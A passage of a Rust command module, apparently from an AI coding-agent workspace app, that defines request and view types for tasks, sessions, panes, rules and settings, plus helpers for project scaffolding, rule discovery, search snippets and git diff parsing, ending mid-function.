// Submodule declarations
pub mod agents;
pub mod analytics;
pub mod project;
pub mod ssh;
pub mod tasks;
pub mod workflow;

// Re-export all command functions from submodules
pub use self::agents::*;
pub use self::analytics::*;
pub use self::project::*;
pub use self::ssh::*;
pub use self::tasks::*;
pub use self::workflow::*;

// ── Shared types, helpers, and utilities ──────────────────────────────────────

use crate::command_registry::{default_registry, RegisteredCommand};
use crate::control::resolve_control_plane_settings;
use crate::event_emitter::EventEmitter;
use crate::state::{AppState, ProjectContext, RecentProject};
use chrono::{DateTime, Utc};
use pnevma_agents::{AgentConfig, AgentEvent, DispatchPool, QueuedDispatch, TaskPayload};
use pnevma_context::{
    ContextCompileInput, ContextCompileMode, ContextCompiler, ContextCompilerConfig,
    DiscoveryConfig, FileDiscovery,
};
use pnevma_core::{
    global_config_path, load_global_config, load_project_config, save_global_config, Check,
    CheckType, GlobalConfig, Priority, ProjectConfig, TaskContract, TaskStatus, WorkflowDef,
};
use pnevma_db::{
    sha256_hex, ArtifactRow, CheckResultRow, CheckRunRow, CheckpointRow, ContextRuleUsageRow,
    CostRow, Db, EventQueryFilter, EventRow, FeedbackRow, GlobalDb, MergeQueueRow, NewEvent,
    NotificationRow, OnboardingStateRow, PaneLayoutTemplateRow, PaneRow, ReviewRow, RuleRow,
    SecretRefRow, SessionRow, SshProfileRow, TaskRow, TelemetryEventRow, TrustRecord,
    WorkflowInstanceRow, WorkflowRow, WorktreeRow,
};
use pnevma_git::GitService;
use pnevma_redaction::{
    normalize_secrets as shared_normalize_secrets, redact_json_value as shared_redact_json_value,
    redact_text as shared_redact_text, StreamRedactionBuffer,
};
use pnevma_session::{
    ScrollbackSlice, SessionEvent, SessionHealth, SessionMetadata, SessionStatus, SessionSupervisor,
};
use serde::{Deserialize, Serialize};
use serde_json::json;
use std::collections::{HashMap, HashSet};
use std::path::{Path, PathBuf};
use std::sync::{Arc, OnceLock, RwLock as StdRwLock};
use tokio::process::Command as TokioCommand;
use tokio::sync::RwLock;
use tokio::time::{timeout, Duration};
use uuid::Uuid;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SessionInput {
    pub name: String,
    pub cwd: String,
    pub command: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PaneInput {
    pub id: Option<String>,
    pub session_id: Option<String>,
    pub r#type: String,
    pub position: String,
    pub label: String,
    pub metadata_json: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PaneLayoutTemplatePane {
    pub id: String,
    pub session_id: Option<String>,
    pub r#type: String,
    pub position: String,
    pub label: String,
    pub metadata_json: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PaneLayoutTemplateView {
    pub id: String,
    pub name: String,
    pub display_name: String,
    pub is_system: bool,
    pub panes: Vec<PaneLayoutTemplatePane>,
    pub created_at: DateTime<Utc>,
    pub updated_at: DateTime<Utc>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SavePaneLayoutTemplateInput {
    pub name: String,
    pub display_name: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ApplyPaneLayoutTemplateInput {
    pub name: String,
    #[serde(default)]
    pub force: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct UnsavedPaneReplacementView {
    pub pane_id: String,
    pub pane_label: String,
    pub pane_type: String,
    pub reason: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ApplyPaneLayoutTemplateResult {
    pub applied: bool,
    pub template_name: String,
    pub replaced_panes: Vec<String>,
    pub unsaved_replacements: Vec<UnsavedPaneReplacementView>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct QueryEventsInput {
    pub event_type: Option<String>,
    pub session_id: Option<String>,
    pub task_id: Option<String>,
    pub from: Option<String>,
    pub to: Option<String>,
    pub limit: Option<i64>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SearchProjectInput {
    pub query: String,
    pub limit: Option<usize>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SearchResultView {
    pub id: String,
    pub source: String,
    pub title: String,
    pub snippet: String,
    pub path: Option<String>,
    pub task_id: Option<String>,
    pub session_id: Option<String>,
    pub timestamp: Option<DateTime<Utc>>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ListProjectFilesInput {
    pub query: Option<String>,
    pub limit: Option<usize>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OpenFileTargetInput {
    pub path: String,
    pub mode: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProjectFileView {
    pub path: String,
    pub status: String,
    pub modified: bool,
    pub staged: bool,
    pub conflicted: bool,
    pub untracked: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileTreeNodeView {
    pub id: String,
    pub name: String,
    pub path: String,
    pub is_directory: bool,
    pub children: Option<Vec<FileTreeNodeView>>,
    pub size: Option<i64>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileOpenResultView {
    pub path: String,
    pub content: String,
    pub truncated: bool,
    pub launched_editor: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TaskDiffInput {
    pub task_id: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DiffHunkView {
    pub header: String,
    pub lines: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DiffFileView {
    pub path: String,
    pub hunks: Vec<DiffHunkView>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TaskDiffView {
    pub task_id: String,
    pub diff_path: String,
    pub files: Vec<DiffFileView>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SessionTimelineInput {
    pub session_id: String,
    pub limit: Option<i64>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SessionRecoveryInput {
    pub session_id: String,
    pub action: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DraftTaskInput {
    pub text: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ScrollbackInput {
    pub session_id: String,
    pub offset: Option<u64>,
    pub limit: Option<usize>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CreateTaskInput {
    pub title: String,
    pub goal: String,
    pub scope: Vec<String>,
    pub acceptance_criteria: Vec<String>,
    #[serde(default)]
    pub constraints: Vec<String>,
    #[serde(default)]
    pub dependencies: Vec<String>,
    pub priority: String,
    #[serde(default)]
    pub auto_dispatch: Option<bool>,
    #[serde(default)]
    pub agent_profile_override: Option<String>,
    #[serde(default)]
    pub execution_mode: Option<String>,
    #[serde(default)]
    pub timeout_minutes: Option<i64>,
    #[serde(default)]
    pub max_retries: Option<i64>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct UpdateTaskInput {
    pub id: String,
    pub title: Option<String>,
    pub goal: Option<String>,
    pub scope: Option<Vec<String>>,
    pub acceptance_criteria: Option<Vec<String>>,
    pub constraints: Option<Vec<String>>,
    pub dependencies: Option<Vec<String>>,
    pub priority: Option<String>,
    pub status: Option<String>,
    pub handoff_summary: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TaskView {
    pub id: String,
    pub project_id: String,
    pub title: String,
    pub goal: String,
    pub scope: Vec<String>,
    pub dependencies: Vec<String>,
    pub acceptance_criteria: Vec<Check>,
    pub constraints: Vec<String>,
    pub priority: String,
    pub status: String,
    pub branch: Option<String>,
    pub worktree_id: Option<String>,
    pub handoff_summary: Option<String>,
    pub auto_dispatch: bool,
    pub agent_profile_override: Option<String>,
    pub execution_mode: Option<String>,
    pub timeout_minutes: Option<i64>,
    pub max_retries: Option<i64>,
    pub created_at: DateTime<Utc>,
    pub updated_at: DateTime<Utc>,
    pub queued_position: Option<usize>,
    pub cost_usd: Option<f64>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WorktreeView {
    pub id: String,
    pub task_id: String,
    pub path: String,
    pub branch: String,
    pub lease_status: String,
    pub lease_started: DateTime<Utc>,
    pub last_active: DateTime<Utc>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProjectStatusView {
    pub project_id: String,
    pub project_name: String,
    pub project_path: String,
    pub sessions: usize,
    pub tasks: usize,
    pub worktrees: usize,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProjectOpenResponse {
    pub project_id: String,
    pub status: ProjectStatusView,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SessionNewResponse {
    pub session_id: String,
    pub binding: SessionBindingView,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProjectSummaryView {
    pub project_id: String,
    pub git_branch: Option<String>,
    pub active_tasks: usize,
    pub active_agents: usize,
    pub cost_today: f64,
    pub unread_notifications: usize,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TaskDispatchResponse {
    pub status: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OkResponse {
    pub ok: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct LiveSessionView {
    pub id: String,
    pub name: String,
    pub status: String,
    pub health: String,
    pub pid: Option<i64>,
    pub cwd: String,
    pub command: String,
    pub started_at: DateTime<Utc>,
    pub last_heartbeat: DateTime<Utc>,
    pub exit_code: Option<i32>,
    pub ended_at: Option<DateTime<Utc>>,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct SessionKillResult {
    pub session_id: String,
    pub outcome: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub message: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct SessionKillFailure {
    pub session_id: String,
    pub message: String,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct SessionKillAllResult {
    pub requested: usize,
    pub killed: usize,
    pub already_gone: usize,
    pub failed: usize,
    pub failures: Vec<SessionKillFailure>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DataRetentionCleanupResponse {
    pub dry_run: bool,
    pub artifacts_pruned: usize,
    pub feedback_artifacts_cleared: usize,
    pub review_packs_pruned: usize,
    pub scrollback_sessions_pruned: usize,
    pub telemetry_exports_pruned: usize,
    pub files_deleted: usize,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TimelineEventView {
    pub timestamp: DateTime<Utc>,
    pub kind: String,
    pub summary: String,
    pub payload: serde_json::Value,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RecoveryOptionView {
    pub id: String,
    pub label: String,
    pub description: String,
    pub enabled: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SessionEnvVarView {
    pub key: String,
    pub value: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SessionBindingView {
    pub session_id: String,
    pub mode: String,
    pub cwd: String,
    pub env: Vec<SessionEnvVarView>,
    pub wait_after_command: bool,
    pub recovery_options: Vec<RecoveryOptionView>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DailyBriefView {
    pub generated_at: DateTime<Utc>,
    pub total_tasks: usize,
    pub ready_tasks: usize,
    pub review_tasks: usize,
    pub blocked_tasks: usize,
    pub failed_tasks: usize,
    pub total_cost_usd: f64,
    pub recent_events: Vec<TimelineEventView>,
    pub recommended_actions: Vec<String>,
    // Extended intelligence fields
    pub active_sessions: usize,
    pub cost_last_24h_usd: f64,
    pub tasks_completed_last_24h: usize,
    pub tasks_failed_last_24h: usize,
    pub stale_ready_count: usize,
    pub longest_running_task: Option<String>,
    pub top_cost_tasks: Vec<TaskCostEntry>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TaskCostEntry {
    pub task_id: String,
    pub title: String,
    pub cost_usd: f64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DraftTaskView {
    pub title: String,
    pub goal: String,
    pub scope: Vec<String>,
    pub acceptance_criteria: Vec<String>,
    pub constraints: Vec<String>,
    pub dependencies: Vec<String>,
    pub priority: String,
    pub source: String,
    pub warnings: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NotificationInput {
    pub title: String,
    pub body: String,
    pub level: Option<String>,
    #[serde(default)]
    pub task_id: Option<String>,
    #[serde(default)]
    pub session_id: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NotificationListInput {
    #[serde(default)]
    pub unread_only: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NotificationView {
    pub id: String,
    pub task_id: Option<String>,
    pub session_id: Option<String>,
    pub title: String,
    pub body: String,
    pub level: String,
    pub unread: bool,
    pub created_at: DateTime<Utc>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TaskCheckResultView {
    pub id: String,
    pub description: String,
    pub check_type: String,
    pub command: Option<String>,
    pub passed: bool,
    pub output: Option<String>,
    pub created_at: DateTime<Utc>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TaskCheckRunView {
    pub id: String,
    pub task_id: String,
    pub status: String,
    pub summary: Option<String>,
    pub created_at: DateTime<Utc>,
    pub results: Vec<TaskCheckResultView>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ReviewPackView {
    pub task_id: String,
    pub status: String,
    pub review_pack_path: String,
    pub reviewer_notes: Option<String>,
    pub approved_at: Option<DateTime<Utc>>,
    pub pack: serde_json::Value,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MergeQueueItemView {
    pub id: String,
    pub task_id: String,
    pub task_title: String,
    pub status: String,
    pub blocked_reason: Option<String>,
    pub approved_at: DateTime<Utc>,
    pub started_at: Option<DateTime<Utc>>,
    pub completed_at: Option<DateTime<Utc>>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MoveMergeQueueInput {
    pub task_id: String,
    pub direction: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ReviewDecisionInput {
    pub task_id: String,
    pub note: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SecretRefInput {
    pub name: String,
    pub scope: String,
    pub value: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SecretRefView {
    pub id: String,
    pub project_id: Option<String>,
    pub scope: String,
    pub name: String,
    pub keychain_service: String,
    pub keychain_account: String,
    pub created_at: DateTime<Utc>,
    pub updated_at: DateTime<Utc>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CheckpointInput {
    pub description: Option<String>,
    pub task_id: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CheckpointView {
    pub id: String,
    pub task_id: Option<String>,
    pub git_ref: String,
    pub created_at: DateTime<Utc>,
    pub description: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExecuteRegisteredCommandInput {
    pub id: String,
    #[serde(default)]
    pub args: HashMap<String, String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RuleUpsertInput {
    pub id: Option<String>,
    pub name: String,
    pub content: String,
    pub scope: Option<String>,
    pub active: Option<bool>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RuleToggleInput {
    pub id: String,
    pub active: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RuleUsageInput {
    pub rule_id: String,
    pub limit: Option<i64>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RuleView {
    pub id: String,
    pub name: String,
    pub path: String,
    pub scope: String,
    pub active: bool,
    pub content: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RuleUsageView {
    pub run_id: String,
    pub included: bool,
    pub reason: String,
    pub created_at: DateTime<Utc>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct KnowledgeCaptureInput {
    pub task_id: Option<String>,
    pub kind: String,
    pub title: Option<String>,
    pub content: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ArtifactView {
    pub id: String,
    pub task_id: Option<String>,
    pub r#type: String,
    pub path: String,
    pub description: Option<String>,
    pub created_at: DateTime<Utc>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct KeybindingView {
    pub action: String,
    pub shortcut: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SetKeybindingInput {
    pub action: String,
    pub shortcut: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OnboardingStateView {
    pub step: String,
    pub completed: bool,
    pub dismissed: bool,
    pub updated_at: DateTime<Utc>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AdvanceOnboardingInput {
    pub step: String,
    pub completed: Option<bool>,
    pub dismissed: Option<bool>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EnvironmentReadinessInput {
    pub path: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EnvironmentReadinessView {
    pub git_available: bool,
    pub detected_adapters: Vec<String>,
    pub global_config_path: String,
    pub global_config_exists: bool,
    pub project_path: Option<String>,
    pub project_initialized: bool,
    pub missing_steps: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct InitializeGlobalConfigInput {
    pub default_provider: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct InitGlobalConfigResultView {
    pub created: bool,
    pub path: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct InitializeProjectScaffoldInput {
    pub path: String,
    pub project_name: Option<String>,
    pub project_brief: Option<String>,
    pub default_provider: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct InitProjectScaffoldResultView {
    pub root_path: String,
    pub created_paths: Vec<String>,
    pub already_initialized: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TelemetryStatusView {
    pub opted_in: bool,
    pub queued_events: i64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AppSettingsView {
    pub auto_save_workspace_on_quit: bool,
    pub restore_windows_on_launch: bool,
    pub auto_update: bool,
    pub default_shell: String,
    pub terminal_font: String,
    pub terminal_font_size: u32,
    pub scrollback_lines: u32,
    pub sidebar_background_offset: f64,
    pub focus_border_enabled: bool,
    pub focus_border_opacity: f64,
    pub focus_border_width: f64,
    pub focus_border_color: String,
    pub telemetry_enabled: bool,
    pub crash_reports: bool,
    pub keybindings: Vec<KeybindingView>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SetAppSettingsInput {
    pub auto_save_workspace_on_quit: bool,
    pub restore_windows_on_launch: bool,
    pub auto_update: bool,
    pub default_shell: String,
    pub terminal_font: String,
    pub terminal_font_size: u32,
    pub scrollback_lines: u32,
    pub sidebar_background_offset: f64,
    pub focus_border_enabled: bool,
    pub focus_border_opacity: f64,
    pub focus_border_width: f64,
    pub focus_border_color: String,
    pub telemetry_enabled: bool,
    pub crash_reports: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SetTelemetryInput {
    pub opted_in: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExportTelemetryInput {
    pub path: Option<String>,
    pub limit: Option<i64>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FeedbackInput {
    pub category: String,
    pub body: String,
    pub contact: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FeedbackView {
    pub id: String,
    pub category: String,
    pub body: String,
    pub contact: Option<String>,
    pub artifact_path: Option<String>,
    pub created_at: DateTime<Utc>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PartnerMetricsInput {
    pub days: Option<i64>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PartnerMetricsReportView {
    pub generated_at: DateTime<Utc>,
    pub window_days: i64,
    pub sessions_started: i64,
    pub tasks_created: i64,
    pub tasks_done: i64,
    pub merges_completed: i64,
    pub knowledge_captures: i64,
    pub feedback_count: i64,
    pub feedback_with_contact: i64,
    pub telemetry_events: i64,
    pub onboarding_completed: bool,
    pub avg_task_cycle_hours: Option<f64>,
}

/// Reject path components that could traverse directories.
pub(crate) fn validate_path_component(name: &str, label: &str) -> Result<(), String> {
    if name.is_empty() {
        return Err(format!("{label} must not be empty"));
    }
    if name.contains('/') || name.contains('\\') || name.contains('\0') || name.contains("..") {
        return Err(format!(
            "{label} must not contain '/', '\\\\', '\\0', or '..'"
        ));
    }
    Ok(())
}

fn map_priority(priority: &str) -> Priority {
    match priority {
        "P0" => Priority::P0,
        "P1" => Priority::P1,
        "P2" => Priority::P2,
        _ => Priority::P3,
    }
}

fn parse_status(status: &str) -> TaskStatus {
    match status {
        "Ready" => TaskStatus::Ready,
        "InProgress" => TaskStatus::InProgress,
        "Review" => TaskStatus::Review,
        "Done" => TaskStatus::Done,
        "Failed" => TaskStatus::Failed,
        "Blocked" => TaskStatus::Blocked,
        _ => TaskStatus::Planned,
    }
}

fn status_to_str(status: &TaskStatus) -> &'static str {
    match status {
        TaskStatus::Planned => "Planned",
        TaskStatus::Ready => "Ready",
        TaskStatus::InProgress => "InProgress",
        TaskStatus::Review => "Review",
        TaskStatus::Done => "Done",
        TaskStatus::Failed => "Failed",
        TaskStatus::Blocked => "Blocked",
    }
}

fn map_priority_str(priority: &Priority) -> &'static str {
    match priority {
        Priority::P0 => "P0",
        Priority::P1 => "P1",
        Priority::P2 => "P2",
        Priority::P3 => "P3",
    }
}

fn parse_dt(input: Option<String>) -> Option<DateTime<Utc>> {
    input
        .and_then(|v| DateTime::parse_from_rfc3339(&v).ok())
        .map(|v| v.with_timezone(&Utc))
}

fn normalize_rule_scope(scope: &str) -> &'static str {
    if scope.eq_ignore_ascii_case("convention") || scope.eq_ignore_ascii_case("conventions") {
        "convention"
    } else {
        "rule"
    }
}

fn scope_default_dir(scope: &str) -> &'static str {
    if normalize_rule_scope(scope) == "convention" {
        ".pnevma/conventions"
    } else {
        ".pnevma/rules"
    }
}

fn slugify_with_fallback(input: &str, fallback: &str) -> String {
    let mut out = String::with_capacity(input.len());
    let mut last_sep = false;
    for ch in input.chars() {
        if ch.is_ascii_alphanumeric() {
            out.push(ch.to_ascii_lowercase());
            last_sep = false;
        } else if !last_sep {
            out.push('-');
            last_sep = true;
        }
    }
    let trimmed = out.trim_matches('-');
    if trimmed.is_empty() {
        fallback.to_string()
    } else {
        trimmed.to_string()
    }
}

fn default_keybindings() -> HashMap<String, String> {
    HashMap::from_iter([
        ("command_palette.toggle".to_string(), "Mod+K".to_string()),
        ("command_palette.next".to_string(), "ArrowDown".to_string()),
        ("command_palette.prev".to_string(), "ArrowUp".to_string()),
        ("command_palette.execute".to_string(), "Enter".to_string()),
        ("pane.focus_next".to_string(), "Mod+]".to_string()),
        ("pane.focus_prev".to_string(), "Mod+[".to_string()),
        ("task.new".to_string(), "Mod+Shift+N".to_string()),
        (
            "task.dispatch_next_ready".to_string(),
            "Mod+Shift+D".to_string(),
        ),
        ("review.approve_next".to_string(), "Mod+Shift+A".to_string()),
    ])
}

fn is_supported_keybinding_action(action: &str) -> bool {
    default_keybindings().contains_key(action)
}

fn is_git_available() -> bool {
    std::process::Command::new("git")
        .arg("--version")
        .output()
        .map(|out| out.status.success())
        .unwrap_or(false)
}

fn project_is_initialized(path: &Path) -> bool {
    path.join("pnevma.toml").is_file() && path.join(".pnevma").is_dir()
}

fn normalize_scaffold_path(path: &str) -> Result<PathBuf, String> {
    let raw = path.trim();
    if raw.is_empty() {
        return Err("path is required".to_string());
    }
    let candidate = PathBuf::from(raw);
    if candidate.is_absolute() {
        Ok(candidate)
    } else {
        let cwd = std::env::current_dir().map_err(|e| e.to_string())?;
        Ok(cwd.join(candidate))
    }
}

fn normalize_default_provider(provider: Option<&str>) -> String {
    match provider.map(str::trim) {
        Some("codex") => "codex".to_string(),
        Some("claude-code") => "claude-code".to_string(),
        Some(value) if !value.is_empty() => value.to_string(),
        _ => "claude-code".to_string(),
    }
}

fn toml_escaped(value: &str) -> String {
    value
        .replace('\\', "\\\\")
        .replace('"', "\\\"")
        .replace('\n', " ")
        .trim()
        .to_string()
}

fn build_default_project_toml(
    root: &Path,
    project_name: Option<&str>,
    project_brief: Option<&str>,
    default_provider: &str,
) -> String {
    let inferred_name = root
        .file_name()
        .and_then(|value| value.to_str())
        .unwrap_or("Pnevma Project");
    let name = toml_escaped(
        project_name
            .map(str::trim)
            .filter(|value| !value.is_empty())
            .unwrap_or(inferred_name),
    );
    let brief = toml_escaped(
        project_brief
            .map(str::trim)
            .filter(|value| !value.is_empty())
            .unwrap_or("Agent-era execution workspace"),
    );
    let provider = toml_escaped(default_provider);

    format!(
        "\
[project]
name = \"{name}\"
brief = \"{brief}\"

[agents]
default_provider = \"{provider}\"
max_concurrent = 4

[branches]
target = \"main\"
naming = \"task/{{id}}-{{slug}}\"

[automation]
socket_enabled = true
socket_path = \".pnevma/run/control.sock\"
socket_auth = \"same-user\"

[rules]
paths = [\".pnevma/rules/*.md\"]

[conventions]
paths = [\".pnevma/conventions/*.md\"]
"
    )
}

async fn discover_markdown_files(
    patterns: &[String],
    project_path: &Path,
) -> Result<Vec<PathBuf>, String> {
    let mut seen = HashSet::new();
    let mut out = Vec::new();
    for pattern in patterns {
        let absolute = if Path::new(pattern).is_absolute() {
            PathBuf::from(pattern)
        } else {
            project_path.join(pattern)
        };
        if pattern.contains('*') {
            let Some(parent) = absolute.parent() else {
                continue;
            };
            let mut entries = match tokio::fs::read_dir(parent).await {
                Ok(entries) => entries,
                Err(err) if err.kind() == std::io::ErrorKind::NotFound => continue,
                Err(err) => return Err(err.to_string()),
            };
            while let Some(entry) = entries.next_entry().await.map_err(|e| e.to_string())? {
                let path = entry.path();
                if !path.is_file() {
                    continue;
                }
                if path.extension().and_then(|ext| ext.to_str()) != Some("md") {
                    continue;
                }
                let key = path.to_string_lossy().to_string();
                if seen.insert(key) {
                    out.push(path);
                }
            }
        } else if absolute.is_file() {
            let key = absolute.to_string_lossy().to_string();
            if seen.insert(key) {
                out.push(absolute);
            }
        }
    }
    out.sort();
    Ok(out)
}

async fn ensure_rule_rows(
    db: &Db,
    project_id: Uuid,
    project_path: &Path,
    scope: &str,
    patterns: &[String],
) -> Result<(), String> {
    let scope = normalize_rule_scope(scope);
    let files = discover_markdown_files(patterns, project_path).await?;
    let existing = db
        .list_rules(&project_id.to_string(), Some(scope))
        .await
        .map_err(|e| e.to_string())?;
    let mut by_path = HashMap::new();
    for row in existing {
        by_path.insert(row.path.clone(), row);
    }
    for file in files {
        let rel = file
            .strip_prefix(project_path)
            .unwrap_or(&file)
            .to_string_lossy()
            .to_string();
        if by_path.contains_key(&rel) {
            continue;
        }
        let name = file
            .file_stem()
            .and_then(|s| s.to_str())
            .map(ToString::to_string)
            .unwrap_or_else(|| "entry".to_string());
        db.upsert_rule(&RuleRow {
            id: Uuid::new_v4().to_string(),
            project_id: project_id.to_string(),
            name,
            path: rel,
            scope: Some(scope.to_string()),
            active: true,
        })
        .await
        .map_err(|e| e.to_string())?;
    }
    Ok(())
}

async fn load_active_scope_texts(
    db: &Db,
    project_id: Uuid,
    project_path: &Path,
    scope: &str,
) -> Result<Vec<String>, String> {
    let rows = db
        .list_rules(&project_id.to_string(), Some(normalize_rule_scope(scope)))
        .await
        .map_err(|e| e.to_string())?;
    let mut texts = Vec::new();
    for row in rows.into_iter().filter(|r| r.active) {
        let abs = project_path.join(&row.path);
        if let Ok(content) = tokio::fs::read_to_string(abs).await {
            texts.push(content);
        }
    }
    Ok(texts)
}

fn contains_case_insensitive(haystack: &str, needle: &str) -> bool {
    haystack
        .to_ascii_lowercase()
        .contains(&needle.to_ascii_lowercase())
}

fn summarize_match(text: &str, query: &str) -> String {
    if text.is_empty() {
        return String::new();
    }
    let lower_text = text.to_ascii_lowercase();
    let lower_query = query.to_ascii_lowercase();
    let idx = lower_text.find(&lower_query).unwrap_or(0);
    let start = align_to_char_start(text, idx.saturating_sub(80));
    let end = align_to_char_end(text, (idx + lower_query.len() + 120).min(text.len()));
    let mut snippet = text[start..end].replace('\n', " ");
    if start > 0 {
        snippet.insert_str(0, "...");
    }
    if end < text.len() {
        snippet.push_str("...");
    }
    snippet
}

/// Walk forward to the nearest valid UTF-8 char boundary.
fn align_to_char_start(text: &str, pos: usize) -> usize {
    let mut p = pos;
    while p < text.len() && !text.is_char_boundary(p) {
        p += 1;
    }
    p
}

/// Walk backward to the nearest valid UTF-8 char boundary.
fn align_to_char_end(text: &str, pos: usize) -> usize {
    let mut p = pos;
    while p > 0 && !text.is_char_boundary(p) {
        p -= 1;
    }
    p
}

fn parse_porcelain_status_line(line: &str) -> Option<(String, String)> {
    if line.len() < 4 {
        return None;
    }
    let status = line[..2].to_string();
    let path = line[3..].trim();
    if path.is_empty() {
        return None;
    }
    let normalized = if let Some((_, to)) = path.split_once(" -> ") {
        to.trim().to_string()
    } else {
        path.to_string()
    };
    Some((normalized, status))
}

fn parse_diff_patch(patch: &str) -> Vec<DiffFileView> {
    let mut files: Vec<DiffFileView> = Vec::new();
    let mut current_file: Option<DiffFileView> = None;
    let mut current_hunk: Option<DiffHunkView> = None;

    for line in patch.lines() {
        if line.starts_with("diff --git ") {
            if let Some(hunk) = current_hunk.take() {
                if let Some(file) = current_file.as_mut() {
                    file.hunks.push(hunk);
                }
            }
            if let Some(file) = current_file.take() {
                files.push(file);
            }
            let path = line
                .split_whitespace()
                .nth(2)
                .map(|v| v.trim_start_matches("a/").to_string())
                .unwrap_or_else(|| "unknown".to_string());
            current_file = Some(DiffFileView {
                path,
                hunks: Vec::new(),
            });
            continue;
        }

        if line.starts_with("@@") {
            if let Some(hunk) = current_hunk.take() {
                if let Some(file) = current_file.as_mut() {
                    file.hunks.push(hunk);
                }
            }
            current_hunk = Some(DiffHunkView {
